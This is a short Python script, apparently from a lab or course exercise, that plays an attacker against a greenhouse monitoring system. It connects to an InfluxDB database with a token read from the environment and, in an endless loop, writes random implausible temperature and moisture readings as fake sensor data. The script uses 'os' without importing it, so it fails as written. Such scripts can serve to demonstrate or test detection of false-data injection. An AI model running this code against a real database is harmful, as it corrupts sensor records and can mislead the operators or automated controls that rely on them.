# influx_attacker.py
from influxdb_client import InfluxDBClient, Point, WritePrecision
from datetime import datetime
import random

# Target InfluxDB connection (attacker knows these values)
token  = os.environ.get("INFLUXDB_TOKEN") or os.environ.get("INFLUX_TOKEN")
org    = os.environ.get("INFLUXDB_ORG") or os.environ.get("INFLUX_ORG") or "SUTD"
bucket = os.environ.get("INFLUXDB_BUCKET") or os.environ.get("INFLUX_BUCKET") or "greenhouse"
url    = os.environ.get("INFLUXDB_URL") or os.environ.get("INFLUX_URL") or "http://localhost:8086"

client = InfluxDBClient(url=url, token=token, org=org)
write_api = client.write_api()

print("⚠️ Attacker injecting fake data into InfluxDB...")
while True:
    fake_point = (
        Point("greenhouse")
        .field("temperature", random.uniform(29, 40))  # Unrealistic value
        .field("moisture", random.uniform(80, 100))
    )
    write_api.write(bucket=bucket, record=fake_point)
    print("Injected fake data into Influx")
